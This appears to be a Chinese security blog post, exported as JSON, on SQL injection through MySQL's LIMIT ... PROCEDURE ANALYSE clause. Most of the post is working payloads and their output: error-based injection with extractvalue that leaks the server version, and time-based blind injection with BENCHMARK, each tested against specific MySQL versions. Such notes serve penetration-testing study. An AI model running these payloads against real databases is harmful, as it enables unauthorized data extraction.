{"title":"mysql 注入相关总结","slug":"mysql","date":"2021-03-01T15:56:43.000Z","updated":"2021-03-01T16:02:25.335Z","comments":true,"path":"api/articles/mysql.json","photos":[],"link":"","excerpt":null,"covers":["../static/images/image-20210302000052954.png"],"content":"<p>[toc]</p>\n<h1 id=\"limit注入\"><a class=\"markdownIt-Anchor\" href=\"#limit注入\"></a> Limit注入</h1>\n<p>limit注入的限制还是挺多的。</p>\n<p>首先，limit注入只存在于mysql 5.6.6版本以下当中。</p>\n<p>mysql在执行查询语句时，可在后面接analyse语句，而在5.6.6版本之前，analyse语句可以使用函数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from test LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),extractvalue(rand(),concat(0x3a,version())));</span><br><span class=\"line\">ERROR 1105 (HY000): XPATH syntax error: &#39;:5.5.62&#39;</span><br></pre></td></tr></table></figure>\n<p>5.6.6版本之后，mysql官方对analyse语句进行了改写，这里只能输入uint型的数据：</p>\n<p><img src=\"../static/images/image-20210302000052954.png\" alt=\"image-20210302000052954\" /></p>\n<p>因此5.6.6之后再利用这个特性会产生报错：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from site LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class=\"line\">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;extractvalue(rand(),concat(0x3a,version())),1)&#39; at line 1</span><br></pre></td></tr></table></figure>\n<p>而即便再5.5.x版本，实测在5.5.41版本中可以使用时间盲注：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from test limit 0,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1);</span><br><span class=\"line\">ERROR 1105 (HY000): XPATH syntax error: &#39;:0&#39;</span><br></pre></td></tr></table></figure>\n<p>然而在5.5.62版本中，无法使用时间盲注：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from test LIMIT 1,1 procedure analyse(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1); </span><br><span class=\"line\">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;),1)&#39; at line 1</span><br></pre></td></tr></table></figure>\n<p>但是报错注入都是可以用的。</p>\n<p>总结：</p>\n<p>在mysql 5.6.6版本之前，使用analyse函数时可以利用extractvalue函数进行报错注入，而在较低的版本中，还可以使用benchmark配合extractvalue在无回显下进行时间盲注，而在较高版本（至少5.5.62版本及之后），是不可以进行时间盲注的。</p>\n<h1 id=\"未完待续\"><a class=\"markdownIt-Anchor\" href=\"#未完待续\"></a> 未完待续……</h1>\n","categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]}